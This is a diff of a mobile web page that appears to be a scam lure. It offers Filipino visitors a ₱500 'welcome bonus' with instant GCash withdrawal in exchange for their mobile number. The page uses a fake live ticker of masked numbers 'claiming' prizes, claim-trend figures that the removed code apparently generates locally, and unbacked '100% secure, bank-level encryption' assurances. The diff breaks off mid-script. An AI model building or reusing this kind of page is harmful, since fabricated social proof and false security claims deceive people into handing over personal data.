@@ -2,1074 +2,417 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Festival Night | Premium Rewards</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Welcome Bonus | Lucky Drop</title>
     
     <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-
-    <!-- Google Fonts -->
+    
+    <!-- Google Fonts — Disney-Pixar Style -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;500;600;700;800;900&family=Orbitron:wght@400;500;600;700;800;900&family=Poppins:wght@300;400;500;600;700;800&family=Playfair+Display:ital,wght@0,400;0,500;0,600;0,700;0,800;0,900;1,400&family=Forum&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@400;500;600;700;800&family=Cinzel:wght@400;500;600;700;800;900&family=Fredoka:wght@300;400;500;600;700&family=Orbitron:wght@400;500;600;700;800;900&family=Pacifico&family=Playfair+Display:wght@400;500;600;700;800;900&family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     
-    <!-- Font Awesome 6 -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <!-- External CSS -->
     <link rel="stylesheet" href="styles/instyle.css">
-    
-    <!-- ========== EXTRA CSS FOR LINE GRAPH + SINGLE CARD ========== -->
-    <style>
-        /* ============================================================
-           LIVE TICKER - Updated (No Badge)
-           ============================================================ */
-        
-        .live-ticker {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            padding: 8px 20px;
-        }
-        
-        /* ✅ Endpoint Icon - Fade lights only */
-        .graph-endpoint-icon {
-            cursor: pointer;
-        }
-        
-        .graph-endpoint-icon .endpoint-img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            background: transparent;
-            filter: drop-shadow(0 0 8px #39ff14) drop-shadow(0 0 15px rgba(57, 255, 20, 0.5));
-            animation: lightFade 1.5s ease-in-out infinite;
-        }
-        
-        @keyframes lightFade {
-            0%, 100% {
-                filter: drop-shadow(0 0 6px #39ff14) drop-shadow(0 0 12px rgba(57, 255, 20, 0.4));
-                opacity: 0.85;
-            }
-            50% {
-                filter: drop-shadow(0 0 15px #39ff14) drop-shadow(0 0 25px rgba(57, 255, 20, 0.9));
-                opacity: 1;
-            }
-        }
-        
-        /* ========== LINE GRAPH TREND DASHBOARD ========== */
-        .trend-dashboard {
-            background: linear-gradient(145deg, rgba(10, 14, 42, 0.7), rgba(5, 8, 20, 0.85));
-            backdrop-filter: blur(14px);
-            -webkit-backdrop-filter: blur(14px);
-            border: 1px solid rgba(245, 200, 66, 0.15);
-            border-radius: 18px;
-            padding: 16px;
-            margin-bottom: 20px;
-            position: relative;
-            overflow: hidden;
-            box-shadow:
-                0 10px 40px rgba(0, 0, 0, 0.35),
-                inset 0 1px 0 rgba(255, 255, 255, 0.04);
-        }
-        
-        .trend-dashboard::before {
-            content: '';
-            position: absolute;
-            inset: -1px;
-            border-radius: 18px;
-            padding: 1px;
-            background: conic-gradient(from var(--angle, 0deg),
-                rgba(212, 63, 122, 0.3),
-                rgba(245, 200, 66, 0.3),
-                rgba(0, 212, 255, 0.3),
-                rgba(245, 200, 66, 0.3),
-                rgba(212, 63, 122, 0.3));
-            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-            -webkit-mask-composite: xor;
-            mask-composite: exclude;
-            pointer-events: none;
-            animation: borderRotate 6s linear infinite;
-        }
-        
-        @property --angle {
-            syntax: '<angle>';
-            initial-value: 0deg;
-            inherits: false;
-        }
-        
-        @keyframes borderRotate {
-            to { --angle: 360deg; }
-        }
-        
-        /* ========== HEADER ========== */
-        .trend-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 14px;
-            position: relative;
-            z-index: 1;
-        }
-        
-        .trend-live-badge {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            background: rgba(255, 23, 68, 0.15);
-            border: 1px solid rgba(255, 23, 68, 0.3);
-            border-radius: 20px;
-            padding: 3px 10px;
-            font-family: 'Orbitron', monospace;
-            font-size: 8px;
-            font-weight: 800;
-            color: #ff1744;
-            letter-spacing: 1.5px;
-            animation: pulseBadge 1.5s infinite;
-        }
-        
-        .trend-live-badge .live-dot {
-            width: 5px;
-            height: 5px;
-            background: #ff1744;
-            border-radius: 50%;
-            box-shadow: 0 0 8px #ff1744;
-            animation: pulseDot 1s infinite;
-        }
-        
-        @keyframes pulseDot {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.3; transform: scale(0.8); }
-        }
-        
-        @keyframes pulseBadge {
-            0%, 100% { box-shadow: 0 0 0 rgba(255, 23, 68, 0); }
-            50% { box-shadow: 0 0 15px rgba(255, 23, 68, 0.3); }
-        }
-        
-        .trend-title {
-            font-family: 'Orbitron', monospace;
-            font-size: 10px;
-            font-weight: 800;
-            color: #f5c842;
-            letter-spacing: 2px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            text-shadow: 0 0 20px rgba(245, 200, 66, 0.3);
-        }
-        
-        /* ========== LINE GRAPH ========== */
-        .trend-graph-container {
-            background: rgba(5, 8, 20, 0.4);
-            border: 1px solid rgba(245, 200, 66, 0.05);
-            border-radius: 12px;
-            padding: 14px 8px 8px 8px;
-            margin-bottom: 12px;
-            position: relative;
-            z-index: 1;
-        }
-        
-        .line-graph-wrapper {
-            width: 100%;
-            height: 100px;
-            position: relative;
-        }
-        
-        .line-graph-svg {
-            width: 100%;
-            height: 100%;
-            overflow: visible;
-        }
-        
-        .graph-grid-line {
-            stroke: rgba(245, 200, 66, 0.08);
-            stroke-width: 1;
-            stroke-dasharray: 3 3;
-        }
-        
-        .graph-line {
-            fill: none;
-            stroke: url(#lineGradient);
-            stroke-width: 3;
-            stroke-linecap: round;
-            stroke-linejoin: round;
-            filter: drop-shadow(0 0 6px rgba(245, 200, 66, 0.6));
-            stroke-dasharray: 2000;
-            stroke-dashoffset: 2000;
-        }
-        
-        .graph-area {
-            fill: url(#areaGradient);
-            opacity: 0;
-        }
-        
-        .graph-hour-labels {
-            display: flex;
-            justify-content: space-between;
-            padding: 0 2px;
-            margin-top: 8px;
-            font-family: 'Orbitron', monospace;
-            font-size: 7px;
-            color: rgba(255, 255, 255, 0.5);
-            letter-spacing: 0.5px;
-        }
-        
-        .graph-hour-labels span {
-            flex: 1;
-            text-align: center;
-        }
-        
-        .graph-hour-labels span:last-child {
-            color: #39ff14;
-            font-weight: 900;
-            text-shadow: 0 0 8px rgba(57, 255, 20, 0.5);
-        }
-        
-        /* ========== SINGLE CARD - TOTAL CLAIMS ========== */
-        .trend-stats-row-single {
-            display: block;
-            width: 100%;
-            position: relative;
-            z-index: 1;
-        }
-        
-        .trend-stat-card-single {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            background: 
-                linear-gradient(180deg, rgba(255, 255, 255, 0.08) 0%, transparent 50%),
-                linear-gradient(135deg, rgba(10, 14, 42, 0.85), rgba(5, 8, 20, 0.95));
-            border: 2px solid rgba(0, 212, 255, 0.3);
-            border-radius: 16px;
-            padding: 16px 20px;
-            transition: all 0.3s ease;
-            box-shadow: 
-                0 8px 30px rgba(0, 0, 0, 0.4),
-                0 0 25px rgba(0, 212, 255, 0.15),
-                inset 0 1px 0 rgba(255, 255, 255, 0.05);
-            position: relative;
-            overflow: hidden;
-            width: 100%;
-            box-sizing: border-box;
-        }
-        
-        .trend-stat-card-single::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 60%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(0, 212, 255, 0.15), transparent);
-            animation: cardShine 4s infinite;
-        }
-        
-        @keyframes cardShine {
-            0% { left: -100%; }
-            60% { left: 150%; }
-            100% { left: 150%; }
-        }
-        
-        .trend-stat-icon-img {
-            width: 56px;
-            height: 56px;
-            border-radius: 12px;
-            overflow: hidden;
-            flex-shrink: 0;
-            border: 3px solid rgba(0, 212, 255, 0.4);
-            box-shadow: 
-                0 0 20px rgba(0, 212, 255, 0.3),
-                inset 0 0 10px rgba(0, 212, 255, 0.1);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: rgba(10, 14, 42, 0.6);
-            position: relative;
-            z-index: 2;
-        }
-        
-        .trend-stat-icon-img img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            border-radius: 9px;
-        }
-        
-        .trend-stat-icon-emoji {
-            position: absolute;
-            bottom: -4px;
-            right: -4px;
-            font-size: 18px;
-            background: linear-gradient(135deg, #ffeb3b, #ff9800);
-            border-radius: 50%;
-            width: 24px;
-            height: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 
-                0 0 10px rgba(255, 215, 0, 0.8),
-                0 2px 0 #8b4500;
-            border: 2px solid #fff9c4;
-            animation: emojiBounce 2s ease-in-out infinite;
-            z-index: 3;
-        }
-        
-        @keyframes emojiBounce {
-            0%, 100% { transform: scale(1) rotate(-5deg); }
-            50% { transform: scale(1.15) rotate(5deg); }
-        }
-        
-        .trend-stat-card-single .trend-stat-content {
-            flex: 1;
-            min-width: 0;
-            position: relative;
-            z-index: 2;
-        }
-        
-        .trend-stat-card-single .trend-stat-label {
-            font-family: 'Orbitron', monospace;
-            font-size: 9px;
-            color: rgba(0, 212, 255, 0.8);
-            letter-spacing: 2px;
-            margin-bottom: 4px;
-            text-shadow: 0 0 8px rgba(0, 212, 255, 0.5);
-            font-weight: 700;
-        }
-        
-        .trend-stat-card-single .trend-stat-value {
-            font-family: 'Orbitron', monospace;
-            font-size: 32px;
-            font-weight: 900;
-            color: #00d4ff;
-            line-height: 1;
-            margin-bottom: 4px;
-            text-shadow: 0 0 20px rgba(0, 212, 255, 0.6);
-            letter-spacing: 1px;
-        }
-        
-        .trend-stat-card-single .trend-stat-sub {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-family: 'Orbitron', monospace;
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.85);
-            font-weight: 700;
-        }
-        
-        .trend-stat-card-single .trend-stat-sub span:last-child {
-            color: #f5c842;
-            font-size: 14px;
-            font-weight: 900;
-            text-shadow: 0 0 10px rgba(245, 200, 66, 0.4);
-        }
-        
-        .trend-stat-card-single .stat-dot {
-            width: 6px;
-            height: 6px;
-            border-radius: 50%;
-            background: #00d4ff;
-            box-shadow: 0 0 8px #00d4ff;
-            flex-shrink: 0;
-            animation: pulseDot 1.5s infinite;
-        }
-        
-        /* ========== RESET TIMER ========== */
-        .trend-reset-timer {
-            text-align: center;
-            font-family: 'Orbitron', monospace;
-            font-size: 8px;
-            color: rgba(255, 255, 255, 0.5);
-            margin-top: 12px;
-            padding-top: 10px;
-            border-top: 1px solid rgba(245, 200, 66, 0.08);
-            position: relative;
-            z-index: 1;
-        }
-        
-        .trend-reset-timer i {
-            color: #f5c842;
-            margin-right: 4px;
-        }
-        
-        .trend-reset-timer strong {
-            color: #ff9800;
-            text-shadow: 0 0 8px rgba(255, 152, 0, 0.5);
-        }
-        
-        /* ========== RESPONSIVE ========== */
-        @media (max-width: 400px) {
-            .trend-stat-card-single {
-                padding: 14px 16px;
-                gap: 12px;
-            }
-            
-            .trend-stat-icon-img {
-                width: 48px;
-                height: 48px;
-            }
-            
-            .trend-stat-icon-emoji {
-                width: 20px;
-                height: 20px;
-                font-size: 14px;
-            }
-            
-            .trend-stat-card-single .trend-stat-value {
-                font-size: 26px;
-            }
-            
-            .line-graph-wrapper {
-                height: 85px;
-            }
-        }
-    </style>
 </head>
 <body>
 
-    <!-- ====== NIGHT SKY OVERLAY ====== -->
-    <div class="bg-night-sky"></div>
-    
-    <!-- Fireworks -->
-    <div class="fireworks">
-        <div class="firework burst-1"></div>
-        <div class="firework burst-2"></div>
-        <div class="firework burst-3"></div>
-        <div class="firework burst-4"></div>
-        <div class="firework burst-5"></div>
+    <!-- ============================================================
+         FLOATING CONFETTI BACKGROUND
+         ============================================================ -->
+    <div class="confetti-fall">
+        <span class="confetti-piece pink"></span>
+        <span class="confetti-piece gold"></span>
+        <span class="confetti-piece magenta"></span>
+        <span class="confetti-piece pink"></span>
+        <span class="confetti-piece gold"></span>
+        <span class="confetti-piece magenta"></span>
+        <span class="confetti-piece pink"></span>
+        <span class="confetti-piece gold"></span>
+        <span class="confetti-piece magenta"></span>
     </div>
-    
-    <!-- Bokeh -->
+
+    <!-- ============================================================
+         FLOATING BOKEH LIGHTS
+         ============================================================ -->
     <div class="bokeh">
         <div class="bokeh-circle"></div>
         <div class="bokeh-circle"></div>
         <div class="bokeh-circle"></div>
         <div class="bokeh-circle"></div>
         <div class="bokeh-circle"></div>
-        <div class="bokeh-circle"></div>
-        <div class="bokeh-circle"></div>
-        <div class="bokeh-circle"></div>
-        <div class="bokeh-circle"></div>
-        <div class="bokeh-circle"></div>
-        <div class="bokeh-circle"></div>
-        <div class="bokeh-circle"></div>
-    </div>
-    
-    <!-- Confetti -->
-    <div class="confetti-fall">
-        <div class="confetti-piece pink"></div>
-        <div class="confetti-piece gold"></div>
-        <div class="confetti-piece magenta"></div>
-        <div class="confetti-piece pink"></div>
-        <div class="confetti-piece gold"></div>
-        <div class="confetti-piece magenta"></div>
-        <div class="confetti-piece pink"></div>
-        <div class="confetti-piece gold"></div>
-        <div class="confetti-piece magenta"></div>
-        <div class="confetti-piece pink"></div>
-        <div class="confetti-piece gold"></div>
-        <div class="confetti-piece magenta"></div>
     </div>
 
-    <!-- ====== LIVE TICKER (No FESTIVAL Badge) ====== -->
+    <!-- ============================================================
+         FIREWORKS BACKGROUND
+         ============================================================ -->
+    <div class="fireworks">
+        <div class="firework burst-1"></div>
+        <div class="firework burst-2"></div>
+        <div class="firework burst-3"></div>
+    </div>
+
+    <!-- ============================================================
+         LIVE TICKER
+         ============================================================ -->
     <div class="live-ticker">
         <div class="ticker-dot"></div>
         <div class="ticker-content">
-            <span class="ticker-text" id="winnerEntry">
-                <i class="fas fa-bolt"></i> 
-                0917***4256 received 
-                <span class="ticker-amount">+₱500</span>
-            </span>
+            <div class="ticker-text">
+                <i class="fas fa-star"></i>
+                <span>0917***4256 just claimed <span class="ticker-amount">₱1,200</span></span>
+            </div>
         </div>
+        <div class="ticker-badge">LIVE</div>
     </div>
 
-    <!-- ====== MAIN CARD ====== -->
-    <div class="main-card" id="mainCard">
+    <!-- ============================================================
+         MAIN CARD — DISNEY-PIXAR MEXICAN FESTIVAL THEME
+         ============================================================ -->
+    <div class="main-card">
         
-        <!-- Background Image Inside Container -->
+        <!-- ✅ Piñata Background Image -->
         <div class="card-bg-image"></div>
+        
+        <!-- ✅ Dark overlay for readability -->
         <div class="card-bg-overlay"></div>
-        
-        <!-- Corner Accents -->
-        <span class="corner-deco tl"><i class="fas fa-star"></i></span>
-        <span class="corner-deco tr"><i class="fas fa-star"></i></span>
-        <span class="corner-deco bl"><i class="fas fa-star"></i></span>
-        <span class="corner-deco br"><i class="fas fa-star"></i></span>
-        
-        <!-- Card Content -->
+
+        <!-- ========== CARD CONTENT ========== -->
         <div class="card-content">
-            
-            <!-- Logo Area -->
+
+            <!-- ✅ Corner Decorations -->
+            <div class="corner-deco tl">✨</div>
+            <div class="corner-deco tr">🌺</div>
+            <div class="corner-deco bl">🌺</div>
+            <div class="corner-deco br">✨</div>
+
+            <!-- ========== LOGO AREA ========== -->
             <div class="logo-area">
                 <div class="logo-icon">
-                    <i class="fas fa-wand-magic-sparkles"></i>
                     <div class="logo-ring"></div>
+                    <i class="fas fa-gift"></i>
                 </div>
-                <h1 class="logo-text">FESTIVAL</h1>
-                <h1 class="logo-text-sub">NIGHT</h1>
-                <div class="logo-sub">✦ Magical Celebration ✦</div>
+                <div class="logo-text">LUCKY DROP</div>
+                <div class="logo-text-sub">FESTIVAL</div>
+                <div class="logo-sub">◆ MEXICAN FIESTA ◆</div>
             </div>
 
-            <!-- Value Props -->
+            <!-- ========== VALUE PROPS ========== -->
             <div class="value-props">
                 <div class="prop-row">
-                    <div class="prop-icon"><i class="fas fa-fireworks"></i></div>
-                    <div>
-                        <div class="prop-title">Festival Tasks</div>
-                        <div class="prop-desc">Complete fun tasks & earn rewards</div>
+                    <div class="prop-icon"><i class="fas fa-gift"></i></div>
+                    <div class="prop-content">
+                        <div class="prop-title">🎁 WELCOME BONUS</div>
+                        <div class="prop-desc">₱500 instant bonus para sa lahat ng bagong user</div>
                     </div>
                 </div>
                 <div class="prop-row">
-                    <div class="prop-icon"><i class="fas fa-gem"></i></div>
-                    <div>
-                        <div class="prop-title">Golden Prizes</div>
-                        <div class="prop-desc">₱500 per welcome bonus</div>
+                    <div class="prop-icon"><i class="fas fa-bolt"></i></div>
+                    <div class="prop-content">
+                        <div class="prop-title">⚡ INSTANT WITHDRAWAL</div>
+                        <div class="prop-desc">Instant transfer sa GCash within minutes</div>
                     </div>
                 </div>
                 <div class="prop-row">
-                    <div class="prop-icon"><i class="fas fa-wallet"></i></div>
-                    <div>
-                        <div class="prop-title">Instant Payout</div>
-                        <div class="prop-desc">Withdraw directly to your wallet</div>
+                    <div class="prop-icon"><i class="fas fa-shield-halved"></i></div>
+                    <div class="prop-content">
+                        <div class="prop-title">🔒 100% SECURED</div>
+                        <div class="prop-desc">Bank-level encryption para sa iyong pera</div>
                     </div>
                 </div>
             </div>
 
-            <!-- ========== LIVE TREND DASHBOARD ========== -->
+            <!-- ========== 7-DAY TREND DASHBOARD ========== -->
             <div class="trend-dashboard">
                 <div class="trend-header">
+                    <div class="trend-title">
+                        <i class="fas fa-chart-line"></i>
+                        <span>7-DAY CLAIM TREND</span>
+                    </div>
                     <div class="trend-live-badge">
                         <span class="live-dot"></span>
                         LIVE
                     </div>
-                    <div class="trend-title">
-                        <i class="fas fa-chart-line"></i>
-                        HOURLY TREND
-                    </div>
                 </div>
-                
-                <!-- Line Graph -->
+
                 <div class="trend-graph-container">
-                    <div class="line-graph-wrapper">
-                        <svg class="line-graph-svg" id="lineGraphSvg" viewBox="0 0 340 100" preserveAspectRatio="none">
-                            <defs>
-                                <linearGradient id="lineGradient" x1="0%" y1="0%" x2="100%" y2="0%">
-                                    <stop offset="0%" stop-color="#d43f7a" />
-                                    <stop offset="50%" stop-color="#f5c842" />
-                                    <stop offset="100%" stop-color="#39ff14" />
-                                </linearGradient>
-                                <linearGradient id="areaGradient" x1="0%" y1="0%" x2="0%" y2="100%">
-                                    <stop offset="0%" stop-color="#f5c842" stop-opacity="0.5" />
-                                    <stop offset="100%" stop-color="#f5c842" stop-opacity="0" />
-                                </linearGradient>
-                            </defs>
-                            
-                            <!-- Grid lines -->
-                            <line class="graph-grid-line" x1="0" y1="20" x2="340" y2="20" />
-                            <line class="graph-grid-line" x1="0" y1="50" x2="340" y2="50" />
-                            <line class="graph-grid-line" x1="0" y1="80" x2="340" y2="80" />
-                            
-                            <!-- Area under line -->
-                            <path class="graph-area" id="graphArea" d="" />
-                            
-                            <!-- Line -->
-                            <path class="graph-line" id="graphLine" d="" />
-                            
-                            <!-- Data points and endpoint -->
-                            <g id="graphPoints"></g>
-                        </svg>
-                    </div>
-                    
-                    <!-- Hour labels -->
-                    <div class="graph-hour-labels">
-                        <span>12AM</span>
-                        <span>3AM</span>
-                        <span>6AM</span>
-                        <span>9AM</span>
-                        <span>12PM</span>
-                        <span>3PM</span>
-                        <span>6PM</span>
-                        <span>9PM</span>
-                        <span>NOW</span>
+                    <div class="trend-graph" id="trendGraph">
+                        <div class="graph-loading">
+                            <i class="fas fa-spinner fa-spin"></i>
+                            <span>Loading...</span>
+                        </div>
                     </div>
                 </div>
-                
-                <!-- SINGLE CARD: TOTAL CLAIMS -->
-                <div class="trend-stats-row-single">
-                    <div class="trend-stat-card-single">
-                        <div class="trend-stat-icon-img">
-                            <img src="images/PT_icon.png" alt="Festival Task">
-                            <div class="trend-stat-icon-emoji">🎯</div>
+
+                <div class="trend-stats-row">
+                    <div class="trend-stat-card">
+                        <div class="trend-stat-icon blue">
+                            <i class="fas fa-users"></i>
                         </div>
                         <div class="trend-stat-content">
-                            <div class="trend-stat-label">FESTIVAL TASK</div>
-                            <div class="trend-stat-value" id="totalClaimsCount">0</div>
+                            <div class="trend-stat-label">TODAY CLAIMS</div>
+                            <div class="trend-stat-value" id="todayClaims">0</div>
                             <div class="trend-stat-sub">
-                                <span class="stat-dot"></span>
-                                <span id="totalClaimsAmount">₱0</span>
+                                <span class="stat-dot blue"></span>
+                                <span>Active users</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="trend-stat-card">
+                        <div class="trend-stat-icon green">
+                            <i class="fas fa-peso-sign"></i>
+                        </div>
+                        <div class="trend-stat-content">
+                            <div class="trend-stat-label">TOTAL CLAIMED</div>
+                            <div class="trend-stat-value" id="totalClaimed">₱0</div>
+                            <div class="trend-stat-sub">
+                                <span class="stat-dot green"></span>
+                                <span>Today</span>
                             </div>
                         </div>
                     </div>
                 </div>
+            </div>
+
+            <!-- ========== ✅ REMASTERED VERIFICATION FORM ========== -->
+            <div class="verification-section" id="verificationSection">
                 
-                <!-- Reset Timer -->
-                <div class="trend-reset-timer">
-                    <i class="fas fa-clock"></i>
-                    Daily reset in <strong id="resetTimer">23:59:59</strong>
+                <div class="verification-header">
+                    <div class="verification-badge">
+                        <i class="fas fa-shield-halved"></i>
+                    </div>
+                    <h3 class="verification-title">WELCOME BONUS</h3>
+                    <p class="verification-subtitle">
+                        Enter your mobile number to claim your <strong>₱500 bonus</strong>
+                    </p>
+                </div>
+
+                <!-- ✅ Remastered Mobile Input (walang +63) -->
+                <div class="mobile-input-wrapper">
+                    <div class="mobile-input-icon">
+                        <i class="fas fa-mobile-screen-button"></i>
+                    </div>
+                    <input 
+                        type="tel" 
+                        id="mobileNumber" 
+                        class="mobile-input" 
+                        placeholder="9XX XXX XXXX" 
+                        maxlength="10"
+                        inputmode="numeric"
+                        autocomplete="off"
+                    >
+                </div>
+
+                <!-- ✅ Error Message -->
+                <div id="verificationError" class="verification-error" style="display: none;">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <span id="verificationErrorText">Please enter a valid mobile number</span>
+                </div>
+
+                <!-- ✅ Remastered Submit Button -->
+                <button class="submit-btn" id="submitBtn">
+                    <i class="fas fa-gift"></i>
+                    <span>CLAIM WELCOME BONUS</span>
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+
+                <!-- ✅ Trust Note -->
+                <div class="trust-note">
+                    <i class="fas fa-lock"></i>
+                    <span>Your data is 100% secure and encrypted</span>
                 </div>
             </div>
 
-            <!-- Swipe to Verify -->
-            <div class="swipe-container">
-                <div class="swipe-track" id="swipeTrack">
-                    <div class="swipe-fire-trail" id="swipeFireTrail"></div>
-                    <div class="swipe-icon" id="swipeIcon">
-                        <img src="images/scatter_icon.jpg" class="scatter-icon" alt="swipe">
-                    </div>
-                    <div class="swipe-text">
-                        <i class="fas fa-arrow-right"></i> 
-                        SWIPE TO VERIFY 
-                        <i class="fas fa-arrow-left"></i>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Footer -->
+            <!-- ========== CARD FOOTER ========== -->
             <div class="card-footer">
                 <i class="fas fa-shield-halved"></i>
-                <span>Protected by Festival Magic</span>
+                <span>SECURED BY LUCKY DROP FESTIVAL</span>
             </div>
+
         </div>
     </div>
 
-    <!-- ====== MODAL ====== -->
+    <!-- ============================================================
+         MODAL — VERIFICATION SUCCESS / LOADING
+         ============================================================ -->
     <div class="modal-overlay" id="modalOverlay">
         <div class="modal-container">
-            <div class="modal-card">
-                <button class="modal-close" onclick="closeModal()">
-                    <i class="fas fa-xmark"></i>
-                </button>
-                
-                <div id="modalBodyContent">
-                    <div class="modal-icon">
-                        <i class="fas fa-wand-magic-sparkles"></i>
-                    </div>
-                    
-                    <h2 class="modal-title">✦ VERIFICATION ✦</h2>
-                    <p class="modal-subtitle">
-                        This will be your <span class="gold-text">Player ID</span><br>
-                        Enter the magical night celebration
-                    </p>
-                    
-                    <div class="bonus-box-premium">
-                        <div class="bonus-glow"></div>
-                        <div class="bonus-amount-premium">₱500</div>
-                        <div class="bonus-label-premium">
-                            <i class="fas fa-gift"></i> 
-                            FESTIVAL REWARD 
-                            <i class="fas fa-gift"></i>
-                        </div>
-                        <div class="bonus-shine"></div>
-                    </div>
-                    
-                    <div class="input-group-premium">
-                        <label class="input-label-premium">
-                            <i class="fas fa-mobile-screen-button"></i>
-                            Mobile Number
-                        </label>
-                        <div class="input-wrapper-premium">
-                            <span class="input-prefix">+63</span>
-                            <input type="tel" id="userPhone" placeholder="9XX XXX XXXX" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
-                            <span class="input-suffix"><i class="fas fa-check-circle"></i></span>
-                        </div>
-                        <div class="input-hint">
-                            <i class="fas fa-info-circle"></i> 
-                            Enter your 11-digit mobile number
-                        </div>
-                    </div>
-                    
-                    <button class="login-btn" id="claimBtn" onclick="processStep1()">
-                        <span class="login-text">PROCEED</span>
-                        <span class="login-dots"></span>
-                    </button>
-                    
-                    <div class="warning-text-premium">
-                        <i class="fas fa-shield-halved"></i>
-                        <span>Complete more tasks to receive festival payouts</span>
-                    </div>
-                </div>
+            <div class="modal-card" id="modalCard">
+                <!-- Content will be injected by JS -->
             </div>
         </div>
     </div>
 
-    <canvas id="particleCanvas"></canvas>
-
-    <!-- ====== SCRIPTS ====== -->
+    <!-- ============================================================
+         SCRIPTS
+         ============================================================ -->
     <script src="js/config.js"></script>
-    <script src="js/index.js"></script>
-    
-    <!-- ========== TREND GRAPH - INLINE ========== -->
+    <script src="js/festival.js"></script>
+
+    <!-- ============================================================
+         INLINE SCRIPT — Verification Logic
+         ============================================================ -->
     <script>
-        // ============================================================
-        // LIVE TREND DASHBOARD - Line Graph + Total Claims
-        // With transparent PT_icon endpoint (fade lights only)
-        // ============================================================
-        
         (function() {
             'use strict';
-            
-            var db = null;
-            var graphUpdateInterval = null;
-            var claimsRefreshInterval = null;
-            var resetTimerInterval = null;
-            var tickerInterval = null;
-            
-            // ========== INIT ==========
-            function init() {
-                // Firebase
-                if (typeof firebaseConfig !== 'undefined') {
-                    if (!firebase.apps || !firebase.apps.length) {
-                        firebase.initializeApp(firebaseConfig);
-                    }
-                    db = firebase.database();
-                }
-                
-                // Draw line graph
-                drawLineGraph();
-                
-                // Load total claims
-                loadTotalClaims();
-                
-                // Start winner ticker
-                startWinnerTicker();
-                
-                // Update graph every 15 seconds
-                graphUpdateInterval = setInterval(drawLineGraph, 15000);
-                
-                // Refresh claims every 10 seconds
-                claimsRefreshInterval = setInterval(loadTotalClaims, 10000);
-                
-                // Start reset timer
-                startResetTimer();
-                
-                console.log('📊 Live Trend Dashboard initialized');
-            }
-            
-            // ========== DRAW LINE GRAPH WITH TRANSPARENT PT_icon ENDPOINT ==========
-            function drawLineGraph() {
-                var svg = document.getElementById('lineGraphSvg');
-                var linePath = document.getElementById('graphLine');
-                var areaPath = document.getElementById('graphArea');
-                var pointsGroup = document.getElementById('graphPoints');
-                
-                if (!svg || !linePath || !areaPath || !pointsGroup) return;
-                
-                var svgWidth = 340;
-                var svgHeight = 100;
-                var padding = 10;
-                var graphWidth = svgWidth - (padding * 2);
-                var graphHeight = svgHeight - (padding * 2);
-                
-                var now = new Date();
-                var currentHour = now.getHours();
-                
-                // Generate hourly data
-                var hourlyData = [];
-                var maxValue = 1;
-                
-                for (var i = 0; i < 24; i++) {
-                    var hoursAgo = 23 - i;
-                    var hour = (currentHour - hoursAgo + 24) % 24;
-                    var value = getHourlyActivity(hour);
+
+            // ========== DOM ELEMENTS ==========
+            var mobileInput = document.getElementById('mobileNumber');
+            var submitBtn = document.getElementById('submitBtn');
+            var errorMsg = document.getElementById('verificationError');
+            var errorText = document.getElementById('verificationErrorText');
+            var modalOverlay = document.getElementById('modalOverlay');
+            var modalCard = document.getElementById('modalCard');
+
+            // ========== AUTO-FORMAT MOBILE NUMBER ==========
+            if (mobileInput) {
+                mobileInput.addEventListener('input', function() {
+                    // Remove non-digits
+                    var value = this.value.replace(/\D/g, '');
                     
-                    hourlyData.push({
-                        hour: hour,
-                        value: value,
-                        isCurrentHour: (i === 23),
-                        label: formatHour(hour)
-                    });
-                    
-                    if (value > maxValue) maxValue = value;
-                }
-                
-                // Build paths
-                var lineD = '';
-                var areaD = '';
-                var pointsHtml = '';
-                var stepX = graphWidth / (hourlyData.length - 1);
-                
-                var endpointX = 0;
-                var endpointY = 0;
-                
-                for (var j = 0; j < hourlyData.length; j++) {
-                    var point = hourlyData[j];
-                    var x = padding + (j * stepX);
-                    var y = svgHeight - padding - ((point.value / maxValue) * graphHeight);
-                    
-                    if (j === 0) {
-                        lineD = 'M ' + x + ' ' + y;
-                        areaD = 'M ' + x + ' ' + (svgHeight - padding);
-                        areaD += ' L ' + x + ' ' + y;
-                    } else {
-                        lineD += ' L ' + x + ' ' + y;
-                        areaD += ' L ' + x + ' ' + y;
+                    // Limit to 10 digits
+                    if (value.length > 10) {
+                        value = value.substring(0, 10);
                     }
                     
-                    // Save endpoint (rightmost)
-                    if (point.isCurrentHour) {
-                        endpointX = x;
-                        endpointY = y;
-                    }
-                }
-                
